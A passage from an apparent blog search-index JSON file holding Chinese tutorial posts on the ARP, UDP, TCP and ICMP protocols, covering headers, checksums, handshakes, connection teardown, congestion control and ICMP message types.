192.168.3.0/24","categories":[{"name":"工具手册","slug":"工具手册","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"}],"tags":[{"name":"网络工具","slug":"网络工具","permalink":"http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"}]},{"title":"ARP协议","slug":"ARP协议","date":"2020-01-22T15:32:12.000Z","updated":"2020-02-26T02:05:51.105Z","comments":true,"path":"2020/01/22/ARP协议/","link":"","permalink":"http://yoursite.com/2020/01/22/ARP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"1 ARP地址解析协议（IP地址—&gt;MAC地址）地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机与主机之间的通信在物理上实质是网卡与网卡之间的通信，而网卡只认识MAC地址，所以要想实现主机与主机之间的通信，需要知道对方IP地址所对应的MAC地址，完成这一过程的协议就是ARP协议。在具体的网络传输过程中，使用地址解析协议，可根据网络层IP数据包包头中的IP地址信息解析出目标硬件地址（MAC地址）信息，以保证通信的顺利进行。 2 ARP工作原理每台主机或路由器都有一个ARP缓存表，用来保存IP地址与MAC地址的对应关系。 以主机A（192.168.1.5）向主机B（192.168.1.1）发送数据为例。当发送数据时，主机A会在自己的ARP缓存表中寻找是否有目标IP地址。如果找到了，也就知道了目标MAC地址，直接把目标MAC地址写入帧里面发送就可以了；如果在ARP缓存表中没有找到目标IP地址，主机A就会在网络上发送一个广播arp request，请求包中包含了A主机的ip地址和mac地址。网络上其他主机并不响应ARP询问，直接丢弃，只有主机B接收到这个帧时，才以单播方式向主机A做出回应arp reply，并带上自己的ip和mac地址，而B主机收到A的请求包时也会将A主机的IP与MAC对应关系保存在自己的缓存区。A收到B的回应包后便可得知B的MAC地址，将其存入ARP缓存。此后A再向B发送数据时，就可以直接从缓存表中查找B的地址了，然后直接把数据发送给B。由于B在接收A的请求时也保存了A的地址信息，因此B要向A发送数据也可以直接从缓存表中查找。 ARP缓存表设置了生存时间TTL，在一段时间内（一般15到20分钟，跟操作系统有关）如果表中的某一行没有使用，就会被删除，这样可以大大减少ARP缓存表的长度，加快查询速度。 3 ARP封装可以对ARP报文有个直观的认识，深入的话可以结合WireShark抓包学习。","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip协议","slug":"tcp-ip协议","permalink":"http://yoursite.com/tags/tcp-ip%E5%8D%8F%E8%AE%AE/"}]},{"title":"UDP协议","slug":"UDP协议","date":"2020-01-21T01:32:02.000Z","updated":"2020-02-25T14:49:30.714Z","comments":true,"path":"2020/01/21/UDP协议/","link":"","permalink":"http://yoursite.com/2020/01/21/UDP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"1. 概述用户数据报协议（UDP，User Datagram Protocol）为应用程序提供了一种无需建立连接就可以发送封装的 IP 数据报的方法。UDP是一种保留消息边界的简单的面向数据报的协议。UDP不提供差错纠正、队列管理、重复消除、流量控制和拥塞控制，但提供差错检测（包含我们在传输层中碰到的第一个真实的端到端（end-to-end）校验和）。这种协议自身提供最小功能，因此使用它的应用程序要做许多关于数据报如何发送和处理的控制工作。想要保证数据被可靠传递或正确排序，应用程序必须自己实现这些保护功能。一般来说，每个被应用程序请求的UDP输出操作只产生一个UDP数据报，从而发送一个IP数据报。而对于面向数据流的传输层协议（例如TCP），应用程序写入的全部数据与真正在单个IP数据报里传送的或接收方接收的内容可能没有联系。 2. UDP 的主要特点1）. UDP 是无连接的，即发送数据之前不需要建立连接，因此减少了开销和发送数据之前的时延。 2）. UDP 使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的连接状态表。 3）. UDP 是面向报文的。发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付IP层。UDP对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。因此，应用程序必须选择合适大小的报文。 4）. UDP 没有拥塞控制，因此网络出现的拥塞不会使源主机的发送速率降低。很多的实时应用（如IP电话、实时视频会议等）要去源主机以恒定的速率发送数据，并且允许在网络发生拥塞时丢失一些数据，但却不允许数据有太多的时延。UDP正好符合这种要求。 5）. UDP 支持一对一、一对多、多对一和多对多的交互通信。 6）. UDP 的首部开销小，只有8个字节，比TCP的20个字节的首部要短。 虽然某些实时应用需要使用没有拥塞控制的UDP,但当很多的源主机同时都向网络发送高速率的实时视频流时,网络就有可能发生拥塞,结果大家都无法正常接收。因此,不使用拥塞控制功能的UDP有可能会引起网络产生严重的拥塞问题。 还有一些使用UDP的实时应用,需要对UDP的不可靠的传输进行适当的改进,以减少数据的丢失。在这种情况下,应用进程本身可以在不影响应用的实时性的前提下,增加些提高可靠性的措施,如采用前向纠错或重传已丢失的报文。 3. UDP 的首部格式 UDP有两个字段：数据字段和首部字段。首部字段很简单，只有8个字节，由4个字段组成，每个字段的长度都是两个字节。各字段意义如下： 源端口：源端口号。在需要对方回信时选用。不需要时可用全0。 目的端口：目的端口号。这在终点交付报文时必须要使用到。 长度： UDP用户数据报的长度，其最小值是8（仅有首部），发送一个带0字节数据的UDP数据报是允许的。值得注意的是，UDP长度字段是冗余的；IPV4头部包含了数据报的总长度，同时IPV6头部包含了负载长度。因此，一个UDP/IPV4数据报的长度等于IPV4数据报的总长度减去IPV4头部的长度。一个UDP/IPV6数据报的长度等于包含在IPV6头部中的负载长度（payload length）字段的值减去所有扩展头部（除非使用了超长数据报）的长度。这两种情况下，UDP长度字段应该与从IP层提供的信息计算得到的长度是一致的。 校验和：检测UDP用户数据报在传输中是否有错。有错就丢弃。 当运输层从 IP 层收到 UDP 数据报时，根据目的端口，通过相应的端口上交给应用进程。 如果接收方 UDP发现报文中的目的端口号不正确（即不存在对应于该端口号的应用进程），就丢弃该报文，并由网际控制报文协议 ICMP 发送“端口不可达”差错报文给发送方。 请注意，虽然在 UDP 之间的通信要用到其端口号，但由于 UDP 的通信是无连接的，因此不需要使用套接字（TCP 之间的通信必须要在两个套接字之间建立连接）。 3. UDP 校验和UDP 校验和是一个端到端的传输层校验和，是对包含了IP头部中的源（Source）和目的IP地址（Destination Address）字段的 UDP 伪首部计算得到的。它由初始的发送方计算得到，由最终的目的方校验。它在传输中不会被修改（除非它通过一个NAT）。IPV4 头部中的校验和只覆盖整个头部（即它不覆盖IP分组中的任何数据），它在每个IP跳都要被重新计算（因为IPV4 TTL字段的值在数据报转发时会被路由器减少）。传输协议（如 TCP、UDP）使用校验和来覆盖它们的头部和数据。对于 UDP 来说，校验和是可选的，而其他的则是强制的。当 UDP 在IPV6中使用时，校验和的计算与使用是强制的，因为在IP层没有头部校验和。为了给应用程序提供无差错数据，像UDP这样的传输层协议，在投递数据到接收方应用程序之前，必须计算校验和或者使用其他差错监测机制。 3.1 伪首部在UDP伪首部中，包含32位源IP地址，32位目的IP地址，8位填充0，8位协议，16位UDP长度。伪首部并非TCP&amp;UDP数据报中实际的有效成分。伪首部是一个虚拟的数据结构，其中的信息是从数据报所在IP分组头的分组头中提取的，既不向下传送也不向上递交，而仅仅是为计算校验和。 伪头部的目的是让UDP层验证数据是否已经到达正确的目的地（即，该IP没有接受地址错误的数据报，也没有给UDP一个本该其他传输协议的数据报），计算UDP校验和时覆盖的字段，包含了伪头部以及UDP头部和负载。 3.2 UDP 校验和计算方法UDP计算校验和的方法和计算IP数据报首部校验和的方法相似。但不同的是：IP数据报的校验和只检验IP数据报的首部，但UDP的校验和是将首部和数据部分一起都检验。 在发送方，首先是将全零放入检验和字段。再将伪首部以及UDP用户数据报看是由许多16位的字串接起来。若UDP用户数据报的数据部分不是偶数个字节，则要填入一个全零字节(最后一个奇数字节应是16位数的高字节而低字节填0，此字节不发送)。 然后按二进制反码计算出这些16位字的和。 将此和的二进制反码写入校验和字段后，发送此UDP用户数据报。 在接收方，把收到的UDP用户数据报连同伪首部(以及可能的填充全零字节)一起，按二进制反码求这些16位字的和。当无差错时其结果应全为1。否则就表明有差错出现，接收方就丢弃此UDP用户数据报(也可以上交给应用层，但附上出现了差错的警告)。如果校验和字段值为0x0000表示发送方没有计算校验和。 如上图所示，伪首部的第3字段是全零；第4字段是IP首部中的协议字段的值。对于UDP，此协议字段值为17；第5字段是UDP用户数据报的长度。因此，这样的检验和，既检查了UDP用户数据报的源端口和目的端口以及UDP用户数据报的数据部分，又检查了IP数据报的源IP地址和目的地址。注意，UDP数据报的长度在校验和的计算中出现了两次。 计算原理是二进制反码求和运算，具体来说就是： 1230 + 0 &#x3D; 01 + 0 &#x3D; 0 + 1 &#x3D; 11 + 1 &#x3D; 10 如果最高位有进位，就把进位的1取下来与最低位再做一次二进制加法 示例： 图3-2-1 中二进制反码求和的参考代码: 1234567891011121314151617181920#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;cstring&gt;using namespace std;const int MAX_NUM &#x3D; 65536; &#x2F;&#x2F; 2^16 &#x3D; 1 0000 0000 0000 0000int a[15] &#x3D; &#123;153*256+19,8*256+104,171*256+3,14*256+11,17,15,1087,13,15,21573,21332,18766,18176&#125;;&#x2F;&#x2F; 256 &#x3D; 2^8 &#x3D; 1 0000 0000int main()&#123; int sum &#x3D; 0; for(int i&#x3D;0;i&lt;13;i++)&#123; sum +&#x3D; a[i]; if(sum &gt; MAX_NUM)&#123; sum &#x3D; sum % MAX_NUM + 1; &#125; &#125; printf(&quot;%d\\n&quot;,sum); return 0;&#125; 注意：UDP协议（传输层）直接操作IP（网络层）的比特，会导致所谓的“违反分层”（layering violation）规则。但这只对协议实现产生微小的影响，因为一般来说，当数据传递到（或来自于）UDP时，IP层的信息已经是现成的了。相比之下，更应该关注NAT，特别是当UDP数据报被分片时。 尽管UDP数据报校验和在原始UDP规范中是可选的，目前它们还是被要求在主机中默认使用[RFC1122]。在20世纪80年代,一些计算机供应商默认关闭了UDP校验和功能以加速其Sun网络文件系统(NFS)的实现，该网络文件系统使用了UDP。因为有第2层的CRC保护(这要比互联网校验和更强壮)，在许多情况下这可能不会产生问题，然而默认关闭校验和功能被认为是一种不好的方法(也是违反RFC规范的)。早期的互联网经验表明,当数据报通过路由器时，总会存在有软件和硬件漏洞的路由器在转发数据报时会修改其中的比特。如果端到端的UDP校验和被关闭的话，这些UDP数据报中的错误就无法检测到。同时注意到一些更老的数据链路协议(比如，串行线IP或SLIP)没有任何形式的数据链路校验和，因此存在IP分组被修改而检测不到的可能性，除非引入另一种校验和。 考虑到伪头部这样的结构，可以很清楚地看到，当一个UDP/IPv4数据报穿过一个NAT时，不仅IP层头部的校验和要被修改，而且UDP伪头部的校验和也必须被正确地修改，因为IP层的地址和/或UDP层的端日号可能会改变。因此NAT通常因同时修玫分组中协议的多层而违反分层规则。当然，考虑到伪头部本身就是违反分层规则的， NAT没有选择。UDP流量被NAT处理时的一些特定规则由[RFC4784]给出。","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip协议","slug":"tcp-ip协议","permalink":"http://yoursite.com/tags/tcp-ip%E5%8D%8F%E8%AE%AE/"}]},{"title":"TCP协议","slug":"TCP协议","date":"2020-01-19T15:31:57.000Z","updated":"2020-02-25T14:34:17.976Z","comments":true,"path":"2020/01/19/TCP协议/","link":"","permalink":"http://yoursite.com/2020/01/19/TCP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"TCP报文格式 TCP大家都知道是什么东西，这个协议的具体报文格式如下： 标志位 URG：指示报文中有紧急数据，应尽快传送（相当于高优先级的数据）。PSH：为1表示是带有push标志的数据，指示接收方在接收到该报文段以后，应尽快将这个报文段交给应用程序，而不是在缓冲区排队。RST：TCP连接中出现严重差错（如主机崩溃），必须释放连接，在重新建立连接。FIN：发送端已完成数据传输，请求释放连接。SYN：处于TCP连接建立过程。 （Synchronize Sequence Numbers）ACK：确认序号标志，为1时表示确认号有效，为0表示报文中不含确认信息，忽略确认号字段。 窗口滑动窗口大小，这个字段是接收端用来告知发送端自己还有多少缓冲区可以接受数据。于是发送端可以根据这个接收端的处理能力来发送数据，而不会导致接收端处理不过来。（以此控制发送端发送数据的速率，从而达到流量控制。）窗口大小时一个16bit字段，因而窗口大小最大为65535。 头部长度（首部长度）由于TCP首部包含一个长度可变的选项和填充部分，所以需要这么一个值来指定这个TCP报文段到底有多长。或者可以这么理解：就是表示TCP报文段中数据部分在整个TCP报文段中的位置。该字段的单位是32位字，即：4个字节。TCP的滑动窗口大小实际上就是socket的接收缓冲区大小的字节数。 选项和填充部分TCP报文的字段实现了TCP的功能，标识进程、对字节流拆分组装、差错控制、流量控制、建立和释放连接等。其最大长度可根据TCP首部长度进行推算。TCP首部长度用4位表示，那么选项部分最长为：(2^4-1)*（32/8）-20=40字节。三次握手 最开始的时候客户端和服务器都是处于CLOSED状态。主动打开连接的为客户端，被动打开连接的是服务器。 TCP服务器进程先创建传输控制块TCB，时刻准备接受客户进程的连接请求，此时服务器就进入了LISTEN（监听）状态；TCP客户进程也是先创建传输控制块TCB，然后向服务器发出连接请求报文，这是报文首部中的同部位SYN=1，同时选择一个初始序列号 seq=x **，此时，TCP客户端进程进入了 SYN-SENT（同步已发送状态）状态。TCP规定，SYN报文段（SYN=1的报文段）不能携带数据，但需要消耗掉一个序号。TCP服务器收到请求报文后，如果同意连接，则发出确认报文。确认报文中应该 ACK=1，SYN=1，确认号是ack=x+1，同时也要为自己初始化一个序列号 seq=y，此时，TCP服务器进程进入了SYN-RCVD（同步收到）状态。这个报文也不能携带数据，但是同样要消耗一个序号。TCP客户进程收到确认后，还要向服务器给出确认。确认报文的ACK=1，ack=y+1，自己的序列号seq=x+1，此时，TCP连接建立，客户端进入ESTABLISHED（已建立连接）**状态。TCP规定，ACK报文段可以携带数据，但是如果不携带数据则不消耗序号。当服务器收到客户端的确认后也进入ESTABLISHED状态，此后双方就可以开始通信了。 三次握手主要目的是：信息对等和防止超时。防止超时导致脏连接。如果使用的是两次握手建立连接，假设有这样一种场景，客户端发送了第一个请求连接并且没有丢失，只是因为在网络结点中滞留的时间太长了，由于TCP的客户端迟迟没有收到确认报文，以为服务器没有收到，此时重新向服务器发送这条报文，此后客户端和服务器经过两次握手完成连接，传输数据，然后关闭连接。此时此前滞留的那一次请求连接，网络通畅了到达了服务器，这个报文本该是失效的，但是，两次握手的机制将会让客户端和服务器再次建立连接，这将导致不必要的错误和资源的浪费。如果采用的是三次握手，就算是那一次失效的报文传送过来了，服务端接受到了那条失效报文并且回复了确认报文，但是客户端不会再次发出确认。由于服务器收不到确认，就知道客户端并没有请求连接。四次挥手 数据传输完毕后，双方都可释放连接。最开始的时候，客户端和服务器都是处于ESTABLISHED状态，然后客户端主动关闭，服务器被动关闭。 客户端进程发出连接释放报文，并且停止发送数据。释放数据报文首部，FIN=1，其序列号为seq=u（等于前面已经传送过来的数据的最后一个字节的序号加1），此时，客户端进入FIN-WAIT-1（终止等待1）状态。 TCP规定，FIN报文段即使不携带数据，也要消耗一个序号。服务器收到连接释放报文，发出确认报文，ACK=1，ack=u+1，并且带上自己的序列号seq=v，此时，服务端就进入了CLOSE-WAIT（关闭等待）状态。TCP服务器通知高层的应用进程，客户端向服务器的方向就释放了，这时候处于半关闭状态，即客户端已经没有数据要发送了，但是服务器若发送数据，客户端依然要接受。这个状态还要持续一段时间，也就是整个CLOSE-WAIT状态持续的时间。客户端收到服务器的确认请求后，此时，客户端就进入FIN-WAIT-2（终止等待2）状态，等待服务器发送连接释放报文（在这之前还需要接受服务器发送的最后的数据）。服务器将最后的数据发送完毕后，就向客户端发送连接释放报文，FIN=1，ack=u+1，由于在半关闭状态，服务器很可能又发送了一些数据，假定此时的序列号为seq=w，此时，服务器就进入了LAST-ACK（最后确认）状态，等待客户端的确认。客户端收到服务器的连接释放报文后，必须发出确认，ACK=1，ack=w+1，而自己的序列号是seq=u+1，此时，客户端就进入了TIME-WAIT（时间等待）状态。注意此时TCP连接还没有释放，必须经过2MSL（最长报文段寿命）的时间后，当客户端撤销相应的TCB后，才进入CLOSED状态。服务器只要收到了客户端发出的确认，立即进入CLOSED状态。同样，撤销TCB后，就结束了这次的TCP连接。可以看到，服务器结束TCP连接的时间要比客户端早一些。 TIME_WAIT：主动要求关闭的机器表示收到了对方的FIN报文，并发送出了ACK报文，进入TIME_WAIT状态，等2MSL后即可进入到CLOSED状态。如果FIN_WAIT_1状态下，同时收到待FIN标识和ACK标识的报文时，可以直接进入TIME_WAIT状态，而无需经过FIN_WAIT_2状态。 CLOSE_WAIT：被动关闭的机器收到对方请求关闭连接的FIN报文，在第一次ACK应答后，马上进入CLOSE_WAIT状态。这种状态其实标识在等待关闭，并且通知应用发送剩余数据，处理现场信息，关闭相关资源。 为什么客户端最后还要等待2MSL？MSL（Maximum Segment Lifetime），TCP允许不同的实现可以设置不同的MSL值。第一，保证客户端发送的最后一个ACK报文能够到达服务器，因为这个ACK报文可能丢失。站在服务器的角度看来，我已经发送了FIN+ACK报文请求断开了，客户端还没有给我回应，应该是我发送的请求断开报文它没有收到，于是服务器又会重新发送一次，而客户端就能在这个2MSL时间段内收到这个重传的报文，接着给出回应报文，并且会重启2MSL计时器。如果客户端收到服务端的FIN+ACK报文后，发送一个ACK给服务端之后就“自私”地立马进入CLOSED状态，可能会导致服务端无法确认收到最后的ACK指令，也就无法进入CLOSED状态，这是客户端不负责任的表现。第二，防止失效请求。防止类似与“三次握手”中提到了的“已经失效的连接请求报文段”出现在本连接中。客户端发送完最后一个确认报文后，在这个2MSL时间中，就可以使本连接持续的时间内所产生的所有报文段都从网络中消失。这样新的连接中不会出现旧连接的请求报文。 在TIME_WAIT状态无法真正释放句柄资源，在此期间，Socket中使用的本地端口在默认情况下不能再被使用。该限制对于客户端机器来说是无所谓的，但对于高并发服务器来说，会极大地限制有效连接的创建数量，称为性能瓶颈。所以建议将高并发服务器TIME_WAIT超时时间调小。RFC793中规定MSL为2分钟。但是在当前的高速网络中，2分钟的等待时间会造成资源的极大浪费，在高并发服务器上通常会使用更小的值。在服务器上通过变更/etc/sysctl.conf文件来修改该默认值net.ipv4.tcp_fin_timout=30（建议小30s）。修改完之后执行 /sbin/sysctl -p 让参数生效。通过如下命令查看各连接状态的技术情况： [root@node1 ~]# netstat -n | awk ‘/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}’TIME_WAIT 63ESTABLISHED 13 1 2 3为什么建立连接是三次握手，关闭连接确是四次挥手呢？建立连接的时候， 服务器在LISTEN状态下，收到建立连接请求的SYN报文后，把ACK和SYN放在一个报文里发送给客户端。 而关闭连接时，服务器收到对方的FIN报文时，仅仅表示对方不再发送数据了但是还能接收数据，而自己也未必全部数据都发送给对方了，所以己方可以立即关闭，也可以发送一些数据给对方后，再发送FIN报文给对方来表示同意现在关闭连接，因此，己方ACK和FIN一般都会分开发送，从而导致多了一次。滑动窗口 TCP滑动窗口技术通过动态改变窗口大小来调节两台主机间数据传输。每个TCP/IP主机支持全双工数据传输，因此TCP有两个滑动窗口：一个用于接收数据，另一个用于发送数据。TCP使用肯定确认技术，其确认号指的是下一个所期待的字节。 假定发送方设备以每一次三个数据包的方式发送数据，也就是说，窗口大小为3。发送方发送序列号为1、2、3的三个数据包，接收方设备成功接收数据包，用序列号4确认。发送方设备收到确认，继续以窗口大小3发送数据。当接收方设备要求降低或者增大网络流量时，可以对窗口大小进行减小或者增加，本例降低窗口大小为2，每一次发送两个数据包。当接收方设备要求窗口大小为0，表明接收方已经接收了全部数据，或者接收方应用程序没有时间读取数据，要求暂停发送。发送方接收到携带窗口号为0的确认，停止这一方向的数据传输。当链路变好了或者变差了这个窗口还会发生变话，并不是第一次协商好了以后就永远不变了。 滑动窗口协议，是TCP使用的一种流量控制方法。该协议允许发送方在停止并等待确认前可以连续发送多个分组。由于发送方不必每发一个分组就停下来等待确认，因此该协议可以加速数据的传输。 只有在接收窗口向前滑动时（与此同时也发送了确认），发送窗口才有可能向前滑动。收发两端的窗口按照以上规律不断地向前滑动，因此这种协议又称为滑动窗口协议。 流量控制：端到端，接收端的应用层处理速度决定和网速无关，由接收端返回的rwnd控制 cwnd：发送端窗口( congestion window )rwnd：接收端窗口（receiver window）拥塞控制 拥塞控制： 发送端主动控制cwnd，有慢启动（从cwnd初始为1开始启动，指数启动），拥塞避免（到达ssthresh后，为了避免拥塞开始尝试线性增长），快重传（接收方每收到一个报文段都要回复一个当前最大连续位置的确认，发送方只要一连收到三个重复确认就知道接收方丢包了，快速重传丢包的报文，并TCP马上把拥塞窗口 cwnd 减小到1），快恢复（直接从ssthresh线性增长）。 如果网络上的延时突然增加，那么TCP对这个事作出的应对只有重传数据，但是重传会导致网络的负担更重，于是会导致更大的延迟以及更多的丢包，于是这个情况就会进入恶性循环被不断地放大。试想一下，如果一个网络内有成千上万的TCP连接都这么行事，那么马上就会形成“网络风暴”，TCP这个协议就会拖垮整个网络。所以TCP不能忽略网络上发生的事情，而无脑地一个劲地重发数据，对网络造成更大的伤害。对此TCP的设计理念是：TCP不是一个自私的协议，当拥塞发生的时候，要做自我牺牲。就像交通阻塞一样，每个车都应该把路让出来，而不要再去抢路了。 慢启动只有在TCP连接建立和网络出现超时时才使用。每经过一个传输轮次，拥塞窗口 cwnd 就加倍。一个传输轮次所经历的时间其实就是往返时间RTT。不过“传输轮次”更加强调：把拥塞窗口cwnd所允许发送的报文段都连续发送出去，并收到了对已发送的最后一个字节的确认。另外，慢开始的“慢”并不是指cwnd的增长速率慢，而是指在TCP开始发送报文段时先设置cwnd=1，使得发送方在开始时只发送一个报文段（目的是试探一下网络的拥塞情况），然后再逐渐增大cwnd。 为了防止拥塞窗口cwnd增长过大引起网络拥塞，还需要设置一个慢开始门限ssthresh状态变量（如何设置ssthresh）。慢开始门限ssthresh的用法如下： 当 cwnd &lt; ssthresh 时，使用上述的慢开始算法。 当 cwnd &gt; ssthresh 时，停止使用慢开始算法而改用拥塞避免算法。 当 cwnd = ssthresh 时，既可使用慢开始算法，也可使用拥塞控制避免算法。拥塞避免算法：让拥塞窗口cwnd缓慢地增大，即每经过一个往返时间RTT就把发送方的拥塞窗口cwnd加1，而不是加倍。这样拥塞窗口cwnd按线性规律缓慢增长，比慢开始算法的拥塞窗口增长速率缓慢得多。 无论在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞（其根据就是没有收到确认），就要把慢开始门限ssthresh设置为出现拥塞时的发送方窗口值的一半（但不能小于2）。然后把拥塞窗口cwnd重新设置为1，执行慢开始算法。这样做的目的就是要迅速减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组处理完毕。 当TCP连接进行初始化时，把拥塞窗口cwnd置为1。前面已说过，为了便于理解，图中的窗口单位不使用字节而使用报文段的个数。慢开始门限的初始值设置为16个报文段，即 cwnd = 16 。在执行慢开始算法时，拥塞窗口 cwnd 的初始值为1。以后发送方每收到一个对新报文段的确认ACK，就把拥塞窗口值另1，然后开始下一轮的传输（图中横坐标为传输轮次）。因此拥塞窗口cwnd随着传输轮次按指数规律增长。当拥塞窗口cwnd增长到慢开始门限值ssthresh时（即当cwnd=16时），就改为执行拥塞控制算法，拥塞窗口按线性规律增长。假定拥塞窗口的数值增长到24时，网络出现超时（这很可能就是网络发生拥塞了）。更新后的ssthresh值变为12（即变为出现超时时的拥塞窗口数值24的一半），拥塞窗口再重新设置为1，并执行慢开始算法。当cwnd=ssthresh=12时改为执行拥塞避免算法，拥塞窗口按线性规律增长，每经过一个往返时间增加一个MSS的大小。 强调：“拥塞避免”并非指完全能够避免了拥塞。利用以上的措施要完全避免网络拥塞还是不可能的。“拥塞避免”是说在拥塞避免阶段将拥塞窗口控制为按线性规律增长，使网络比较不容易出现拥塞。 如果发送方设置的超时计时器时限已到但还没有收到确认，那么很可能是网络出现了拥塞，致使报文段在网络中的某处被丢弃。这时，TCP马上把拥塞窗口 cwnd 减小到1，并执行慢开始算法，同时把慢开始门限值ssthresh减半。这是不使用快重传的情况。快重传算法首先要求接收方每收到一个失序的报文段后就立即发出重复确认（为的是使发送方及早知道有报文段没有到达对方）而不要等到自己发送数据时才进行捎带确认。 接收方收到了M1和M2后都分别发出了确认。现在假定接收方没有收到M3但接着收到了M4。显然，接收方不能确认M4，因为M4是收到的失序报文段。根据可靠传输原理，接收方可以什么都不做，也可以在适当时机发送一次对M2的确认。但按照快重传算法的规定，接收方应及时发送对M2的重复确认，这样做可以让发送方及早知道报文段M3没有到达接收方。发送方接着发送了M5和M6。接收方收到这两个报文后，也还要再次发出对M2的重复确认。这样，发送方共收到了接收方的四个对M2的确认，其中后三个都是重复确认。快重传算法还规定，发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段M3，而不必继续等待M3设置的重传计时器到期。由于发送方尽早重传未被确认的报文段，因此采用快重传后可以使整个网络吞吐量提高约20%。 与快重传配合使用的还有快恢复算法，其过程有以下两个要点： 当发送方连续收到三个重复确认，就执行“乘法减小”算法，把慢启动门限ssthresh减半。这是为了预防网络发生拥塞。请注意：接下去不执行慢开始算法。由于发送方现在认为网络很可能没有发生拥塞，因此与慢开始不同之处是现在不执行慢开始算法（即拥塞窗口cwnd现在不设置为1），而是把cwnd值设置为慢开始门限ssthresh减半后的数值，然后开始执行拥塞避免算法（“加法增大”），使拥塞窗口缓慢地线性增大。 上图给出了快重传和快恢复的示意图，并标明了“TCP Reno版本”。区别：新的 TCP Reno 版本在快重传之后采用快恢复算法而不是采用慢开始算法。 发送方窗口的上限值 = Min [ rwnd, cwnd ] 当rwnd &lt; cwnd 时，是接收方的接收能力限制发送方窗口的最大值。当cwnd &lt; rwnd 时，则是网络的拥塞限制发送方窗口的最大值。 差错控制 TCP使用差错控制来提供可靠性。差错控制包括以下的一些机制：检测和重传受到损伤的报文段、重传丢失的报文段、保存失序到达的报文段直至缺失的报文到期，以及检测和丢弃重复的报文段。TCP通过三个简单的工具来完成其差错控制：检验和、确认以及超时。","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip协议","slug":"tcp-ip协议","permalink":"http://yoursite.com/tags/tcp-ip%E5%8D%8F%E8%AE%AE/"}]},{"title":"ICMP协议","slug":"ICMP协议","date":"2020-01-17T15:31:31.000Z","updated":"2020-02-25T14:24:04.046Z","comments":true,"path":"2020/01/17/ICMP协议/","link":"","permalink":"http://yoursite.com/2020/01/17/ICMP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"1 ICMP协议 网际控制报文协议ICMP（Internet Control Message Protocol），ICMP允许主机或路由器报告差错情况和提供有关异常情况的报告。 IP数据报在传输的过程中难免出错，对于出错的报文最典型的就是丢弃，同时允许路由器或主机发送ICMP报文报告发送IP数据报的源主机。 ICMP协议的两个作用：差错报告和网络探寻。对应这两个功能，ICMP报文分为：ICMP差错报告报文和ICMP询问报文。 2 ICMP报文格式 ICMP报文作为IP层数据报的数据，加上IP数据报首部发送出去。ICMP协议是网络层协议。 ICMP 差错报告报文的组成： (1) 需要进行差错报告的IP数据报首部和数据字段的前8个字节。 (2) ICMP报文的前8个字节。 3 ICMP差错报告报文差错报告报文共有4种： (1) 终点不可达报文——无法交付 当数据报到达路由器或主机但是不能交付时，数据报就会被丢弃，同时向源点发送终点不可达报文。 (2) 时间超过报文——TTL值为0 1) 当路由器收到生存时间为零的数据报时，除丢弃该数据报外，还要向源点发送时间超过报文。 2) 当终点在规定的时间内不能收到一个数据报全部数据报片时，就把已收到的数据报片全部丢弃，并向源点发送时间超过报文。 (3) 参数问题报文——首部字段有问题 当路由器或目的主机收到的数据报的首部中有的字段值不正确时，就丢弃该数据报，并向源点发送参数问题报文。 (4) 改变路由（重定向）报文——路由不好 互联网中的主机也要有一个路由表，当主机要发送数据时，首先是查找自己的路由表，看应当从哪个接口把数据报发送出去。在刚开始工作时，一般都在路由表中设置一个默认路由器的IP地址（默认网关）。不管数据报发送到哪个目的地址，都一律先把这个数据报传送给这个路由器，而这个默认路由器知道到每一个目的网络的最佳路由（通过和其他路由器交换信息）。如果默认路由器发现主机发往某个目的地址的数据报的最佳路径由应当经过网络上的另一个路由器R时，就用改变路由报文把这一情况告知主机。于是，主机就在其路由表增加一个项目：到某某目的地址应经过的路由器R（而不是默认路由器）。 (5) 源点抑制报文——拥塞丢数据 这种报文已经不使用了。用于流量控制，当路由器或主机由于拥塞而丢弃数据时，就向源点发送源点抑制报文。告知源点将数据报的发送速率放慢。 4种特殊情况下不会发送差错报文： (1) 对ICMP差错报告报文，不再发送ICMP差错报告报文。 前面已经直到，整个ICMP报文封装在IP数据报的数据部分作为IP数据报发送给源点，其本身也是一个IP数据报，如果这个IP数据报也发生了差错，那么将不会再发送差错报文了。 (2) 对第一分片的数据报片的所有后续数据报片，都不发送ICMP差错报告报文。 如果一个数据报被分片为多个数据报片，如果数据报片发生差错，那么只会对第一个分片发送ICMP差错报告报文，其余的均不发送。 (3) 对于多播地址的数据报，都不发送ICMP差错报告报文。 (4) 对具有特殊地址（如127.0.0.0或0.0.0.0）的数据报，不发送ICMP差错报告报文。 4 ICMP询问报文 (1) 回送请求和回答报文 ICMP回送请求报文是由主机或路由器向同一个特定的目的主机发出询问。收到此报文的主机必须给源主机或路由器发送ICMP回送回答报文。 这种报文用来测试目的站是否可达以及了解其有关状态。 (2) 时间戳请求和回答报文 这种报文是请求某台主机或路由器回答当前的日期和时间。 用于时钟同步和时间测量。 (3) 子网掩码请求和应答报文和路由器询问和通告报文这两个报文也不再使用了。 5 ICMP的应用 (1) PING ICMP的一个重要应用就是分组网间探测PING（Packet InterNet Groper），用来测试两台主机的连通性。PING使用了回送请求和回答报文。 